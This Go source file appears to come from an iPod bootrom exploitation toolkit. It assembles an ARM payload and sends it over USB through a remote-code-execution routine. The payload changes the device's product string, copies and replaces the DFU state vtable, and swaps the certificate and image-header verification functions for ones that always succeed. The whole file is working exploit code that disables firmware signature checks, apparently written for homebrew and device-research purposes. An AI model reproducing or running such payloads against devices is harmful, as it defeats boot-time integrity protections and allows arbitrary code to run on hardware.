package haxeddfu

import (
	"fmt"
	"log"
	"unicode/utf16"

	"github.com/google/gousb"

	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/exploit"
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

const ProductString = "haxed dfu"

func makeStringDescriptor(s string) []byte {
	descriptor := []byte{
		0, 0x03,
	}
	for _, cp := range utf16.Encode([]rune(s)) {
		descriptor = append(descriptor, uint8(cp&0xff), uint8(cp>>8))
	}
	descriptor[0] = uint8(len(descriptor))
	return descriptor
}

func Payload(ep *exploit.Parameters) ([]byte, error) {
	if ep.VTableAddr == 00 {
		return nil, fmt.Errorf("not implemented")
	}

	descriptor := makeStringDescriptor(ProductString)

	descriptorSRAM := 0x2202d800
	vtableSRAM := 0x2202d880

	payload := uasm.Program{
		Address: ep.ExecAddr,
		Listing: []uasm.Statement{
			// Copy descriptor to scratch memory space.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(descriptorSRAM)},
			uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
			uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

			uasm.Label("descriptor_copy_loop"),
			uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
			uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
			uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
			uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
			uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
			uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},

			//// Set descriptor in g_State->dfu_state->deviceDescriptor
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(ep.VTableAddr)},
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 1584)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(descriptorSRAM)},
			uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 24)},

			// Copy state vtable to scratch.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(ep.VTableAddr)},
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 36)},
			uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(vtableSRAM)},

			uasm.Label("vtable_copy_loop"),
			uasm.Ldr{Dest: uasm.R3, Src: uasm.Deref(uasm.R0, 0)},
			uasm.Str{Src: uasm.R3, Dest: uasm.Deref(uasm.R2, 0)},
			uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
			uasm.Cmp{A: uasm.R1, B: uasm.Immediate(84)},
			uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("vtable_copy_loop")},

			// Set new VTable in g_State.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(ep.VTableAddr)},
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
			uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(vtableSRAM)},
			uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 36)},

			// Overwrite VTable verify_{certificate,image_header} to no-ops.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(vtableSRAM)},
			uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(ep.Ret1Addr)},
			uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 28)},
			uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 20)},

			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(ep.ReturnAddr)},
			uasm.Bx{Dest: uasm.LR},

			uasm.Label("descriptor"),
			uasm.Embed(descriptor),
		},
	}

	return payload.Assemble(), nil
}

func Trigger(usb *gousb.Device, ep *exploit.Parameters, force bool) error {
	p, err := usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := ProductString, p; want == got {
		if force {
			log.Printf("Device already running haxed DFU, but forcing re-upload")
		} else {
			log.Printf("Device already running haxed DFU")
			return nil
		}
	}
	log.Printf("Generating payload...")

	payload, err := Payload(ep)
	if err != nil {
		return fmt.Errorf("failed to generate payload: %w", err)
	}

	if err := dfu.Clean(usb); err != nil {
		return fmt.Errorf("clean failed: %w", err)
	}
	log.Printf("Running rce....")
	if err := exploit.RCE(usb, ep, payload, nil); err != nil {
		return fmt.Errorf("failed to execute haxed dfu payload: %w", err)
	}

	// Check descriptor got changed.
	p, err = usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := ProductString, p; want != got {
		return fmt.Errorf("string descriptor got unexpected result, wanted %q, got %q", want, got)
	}
	log.Printf("Haxed DFU running!")

	return nil

}
